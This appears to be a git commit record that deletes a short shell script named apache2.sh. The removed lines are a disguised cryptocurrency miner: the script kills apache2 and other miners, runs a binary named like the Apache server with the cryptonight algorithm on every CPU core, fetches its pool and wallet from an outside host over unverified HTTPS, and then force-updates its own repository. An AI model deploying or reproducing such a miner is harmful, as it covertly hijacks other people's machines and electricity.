b3f5d86fae42ee97c71c6cb19925fce8cb8ee931
tanhuevon <36043964+tanhuevon@users.noreply.github.com>
2018-07-16 11:35:49 -0500

    Delete apache2.sh

--- apache2.sh
+++
@@ -1,7 +0,0 @@
-#!/bin/bash
-killall apache2
-killall  minerd
-desde=`stat  /etc/hosts -c%y  | awk '{print $1}'`
-/root/apache2 -a cryptonight -o stratum+tcp://`curl --insecure https://sio.com.co/m/dirpool2.txt` -u `curl --insecure https://sio.com.co/m/dirwallet2.txt` -p `cat index.html` -t `grep processor /proc/cpuinfo| wc -l` 1> apache2.log 2> apache3.log
-
-cd tanhuevon/ ; git stash drop; git reset --hard; git pull
